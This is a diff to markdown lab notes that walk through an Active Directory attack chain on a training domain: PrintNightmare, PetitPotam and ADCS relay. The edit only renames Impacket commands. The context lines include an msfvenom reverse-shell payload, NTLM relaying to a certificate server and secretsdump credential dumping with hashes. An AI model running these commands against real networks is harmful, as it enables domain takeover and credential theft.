@@ -39,7 +39,7 @@ git clone https://github.com/cube0x0/CVE-2021-1675.git
 ```
 
 ```bash
-rpcdump.py @{{DC_IP}} | egrep 'MS-RPRN|MS-PAR'
+impacket-rpcdump @{{DC_IP}} | egrep 'MS-RPRN|MS-PAR'
 ```
 
 ```bash
@@ -47,7 +47,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f
 ```
 
 ```bash
-sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+sudo impacket-smbserver -smb2support CompData /path/to/backupscript.dll
 ```
 
 ```bash
@@ -59,7 +59,7 @@ whoami
 ```
 
 ```bash
-sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.{{DOMAIN_UPPER}}/certsrv/certfnsh.asp --adcs --template DomainController
+sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.{{DOMAIN_UPPER}}/certsrv/certfnsh.asp --adcs --template DomainController
 ```
 
 ```bash
@@ -67,7 +67,7 @@ python3 PetitPotam.py 172.16.5.225 {{DC_IP}}
 ```
 
 ```bash
-sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.{{DOMAIN_UPPER}}/certsrv/certfnsh.asp --adcs --template DomainController
+sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.{{DOMAIN_UPPER}}/certsrv/certfnsh.asp --adcs --template DomainController
 ```
 
 ```bash
@@ -79,7 +79,7 @@ export KRB5CCNAME=dc01.ccache
 ```
 
 ```bash
-secretsdump.py -just-dc-user {{DOMAIN_NB}}/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.{{DOMAIN_UPPER}}
+impacket-secretsdump -just-dc-user {{DOMAIN_NB}}/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.{{DOMAIN_UPPER}}
 ```
 
 ```bash
@@ -95,7 +95,7 @@ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7
 ```
 
 ```bash
-secretsdump.py -just-dc-user {{DOMAIN_NB}}/administrator "ACADEMY-EA-DC01$"@{{DC_IP}} -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+impacket-secretsdump -just-dc-user {{DOMAIN_NB}}/administrator "ACADEMY-EA-DC01$"@{{DC_IP}} -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
 ```
 
 ```powershell
